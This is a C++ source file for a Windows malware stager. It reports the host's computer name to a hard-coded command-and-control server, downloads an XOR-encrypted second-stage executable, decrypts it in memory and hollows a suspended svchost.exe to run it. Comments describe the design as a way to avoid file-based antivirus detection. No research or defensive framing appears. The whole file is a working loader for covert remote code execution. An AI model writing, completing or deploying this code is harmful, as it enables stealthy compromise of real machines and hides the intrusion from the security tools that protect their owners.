// Stage1.cpp  — PE-hollowing stager
// Downloads XOR-encrypted stage 2 via WinHTTP, decrypts in memory,
// hollows svchost.exe with the resulting PE.
// The decrypted PE bytes are NEVER written to disk, so file-based AV
// (e.g. Trojan:Win32/Sabsik.FL.A!ml) has no bytes to scan.
//
// Imports: WinHTTP, Kernel32, Ntdll  (all in-box Windows DLLs)
// Build:   .\build.ps1

#pragma comment(lib, "winhttp.lib")

#include <windows.h>
#include <winhttp.h>
#include <cstdlib>
#include <cstring>

// ── Config (override at compile time) ────────────────────────────────────────
static const BYTE XOR_KEY[] = {0x57,0xA1,0x3F,0xC8,0xB2,0xDE,0x94,0x6A};

#ifndef C2_HOST
#  define C2_HOST L"c2.osatechcloud.cloud"
#endif
#ifndef C2_PORT
#  define C2_PORT 443
#endif

// ── ntdll function pointers ──────────────────────────────────────────────────
typedef NTSTATUS (NTAPI *pfnNtUnmap)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI *pfnNtQIP)(HANDLE, UINT, PVOID, ULONG, PULONG);

struct ProcBasicInfo {
    PVOID r1; PVOID PebBase; PVOID r2[2]; ULONG_PTR pid; PVOID r3;
};

// PEB.ImageBaseAddress on x64 is at offset 0x10
#define PEB_IMAGEBASE_OFF 0x10

// ── XOR decrypt in-place ─────────────────────────────────────────────────────
static void XorDec(BYTE* buf, DWORD len) {
    for (DWORD i = 0; i < len; ++i)
        buf[i] ^= XOR_KEY[i % sizeof(XOR_KEY)];
}

// ── HTTP GET — returns heap buffer (caller frees), NULL on error ──────────────
static BYTE* HttpGet(const wchar_t* host, WORD port,
                     const wchar_t* path, DWORD* outLen) {
    *outLen = 0;
    HINTERNET hS = WinHttpOpen(L"Mozilla/5.0",
                                WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hS) return nullptr;
    HINTERNET hC = WinHttpConnect(hS, host, port, 0);
    if (!hC) { WinHttpCloseHandle(hS); return nullptr; }
    HINTERNET hR = WinHttpOpenRequest(hC, L"GET", path, nullptr, WINHTTP_NO_REFERER,
                                       WINHTTP_DEFAULT_ACCEPT_TYPES,
                                       port == 443 ? WINHTTP_FLAG_SECURE : 0);
    if (!hR || !WinHttpSendRequest(hR, nullptr, 0, nullptr, 0, 0, 0) ||
              !WinHttpReceiveResponse(hR, nullptr)) {
        if (hR) WinHttpCloseHandle(hR);
        WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
        return nullptr;
    }
    BYTE* buf = nullptr; DWORD tot = 0, av = 0, rd = 0;
    while (WinHttpQueryDataAvailable(hR, &av) && av) {
        BYTE* t = (BYTE*)realloc(buf, tot + av);
        if (!t) { free(buf); buf = nullptr; break; }
        buf = t;
        WinHttpReadData(hR, buf + tot, av, &rd);
        tot += rd; av = 0;
    }
    WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
    *outLen = tot;
    return buf;
}

// ── Hollow a new svchost.exe process with the PE at `pe` ─────────────────────
static bool HollowSvchost(BYTE* pe, DWORD /*peLen*/) {
    auto* dos = (PIMAGE_DOS_HEADER)pe;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    auto* nt  = (PIMAGE_NT_HEADERS)(pe + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

    // Spawn svchost.exe suspended
    wchar_t sysDir[MAX_PATH];
    GetSystemDirectoryW(sysDir, MAX_PATH);
    wchar_t svcExe[MAX_PATH + 4];
    wcscpy(svcExe, sysDir); wcscat(svcExe, L"\\svchost.exe");
    wchar_t svcCmd[MAX_PATH + 20];
    wcscpy(svcCmd, svcExe); wcscat(svcCmd, L" -k netsvcs");

    STARTUPINFOW si{sizeof(si)};
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    if (!CreateProcessW(svcExe, svcCmd, nullptr, nullptr, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        nullptr, nullptr, &si, &pi))
        return false;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto NtUnmap = (pfnNtUnmap)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    auto NtQIP   = (pfnNtQIP)  GetProcAddress(ntdll, "NtQueryInformationProcess");

    // Unmap original svchost image so we can place our PE at its preferred base
    if (NtQIP && NtUnmap) {
        ProcBasicInfo pbi{};
        if (!NtQIP(pi.hProcess, 0, &pbi, sizeof(pbi), nullptr)) {
            ULONG_PTR origBase = 0;
            ReadProcessMemory(pi.hProcess,
                              (BYTE*)pbi.PebBase + PEB_IMAGEBASE_OFF,
                              &origBase, sizeof(origBase), nullptr);
            if (origBase) NtUnmap(pi.hProcess, (PVOID)origBase);
        }
    }

    // Allocate at our PE's preferred base; fall back to any address if busy
    auto preferred = (LPVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase;
    SIZE_T imgSz   = nt->OptionalHeader.SizeOfImage;
    LPVOID remote  = VirtualAllocEx(pi.hProcess, preferred, imgSz,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote)
        remote = VirtualAllocEx(pi.hProcess, nullptr, imgSz,
                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return false;
    }

    // Write PE headers into remote process
    WriteProcessMemory(pi.hProcess, remote, pe,
                       nt->OptionalHeader.SizeOfHeaders, nullptr);

    // Write each section
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i)
        if (sec[i].SizeOfRawData)
            WriteProcessMemory(pi.hProcess,
                               (BYTE*)remote + sec[i].VirtualAddress,
                               pe + sec[i].PointerToRawData,
                               sec[i].SizeOfRawData, nullptr);

    // Fix base relocations if we didn't get the preferred base
    ULONG_PTR delta = (ULONG_PTR)remote - (ULONG_PTR)nt->OptionalHeader.ImageBase;
    if (delta) {
        auto& relDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        for (DWORD done = 0; done < relDir.Size; ) {
            auto* blk = (PIMAGE_BASE_RELOCATION)(pe + relDir.VirtualAddress + done);
            if (!blk->VirtualAddress) break;
            DWORD cnt = (blk->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
            auto* ent = (WORD*)((BYTE*)blk + sizeof(IMAGE_BASE_RELOCATION));
            for (DWORD k = 0; k < cnt; ++k) {
                int  type = ent[k] >> 12;
                DWORD off = ent[k] & 0xFFF;
                if (type == IMAGE_REL_BASED_DIR64 || type == IMAGE_REL_BASED_HIGHLOW) {
                    ULONG_PTR addr = (ULONG_PTR)remote + blk->VirtualAddress + off;
                    ULONG_PTR val  = 0;
                    ReadProcessMemory(pi.hProcess,  (LPCVOID)addr, &val, sizeof(val), nullptr);
                    val += delta;
                    WriteProcessMemory(pi.hProcess, (LPVOID) addr, &val, sizeof(val), nullptr);
                }
            }
            done += blk->SizeOfBlock;
        }
    }

    // Update PEB.ImageBaseAddress so the process sees the correct image base
    if (NtQIP) {
        ProcBasicInfo pbi{};
        if (!NtQIP(pi.hProcess, 0, &pbi, sizeof(pbi), nullptr)) {
            ULONG_PTR nb = (ULONG_PTR)remote;
            WriteProcessMemory(pi.hProcess,
                               (BYTE*)pbi.PebBase + PEB_IMAGEBASE_OFF,
                               &nb, sizeof(nb), nullptr);
        }
    }

    // Redirect the suspended thread to the new entry point.
    // On x64, the main thread starts in ntdll!RtlUserThreadStart with
    // Rcx = EntryPoint — we overwrite Rcx to point to our PE's EP.
    CONTEXT ctx{}; ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return false;
    }
    ctx.Rcx = (DWORD64)remote + nt->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

// ── WinMain ───────────────────────────────────────────────────────────────────
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // Send check-in with hostname so the C2 dashboard logs it
    wchar_t host[MAX_COMPUTERNAME_LENGTH + 1]{};
    DWORD n = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(host, &n);

    wchar_t ciPath[256] = L"/stage/checkin?host=";
    wcscat(ciPath, host);
    DWORD dummy = 0;
    BYTE* ci = HttpGet(C2_HOST, C2_PORT, ciPath, &dummy);
    if (ci) free(ci);

    // Download XOR-encrypted stage 2 PE
    DWORD payLen = 0;
    BYTE* pay = HttpGet(C2_HOST, C2_PORT, L"/stage/payload", &payLen);
    if (!pay || payLen < 0x40) { if (pay) free(pay); return 0; }

    // Decrypt in memory — this buffer is never flushed to disk as a PE file
    XorDec(pay, payLen);

    // Inject into svchost.exe via process hollowing
    HollowSvchost(pay, payLen);

    // Wipe and free the decrypted bytes
    SecureZeroMemory(pay, payLen);
    free(pay);
    return 0;
}
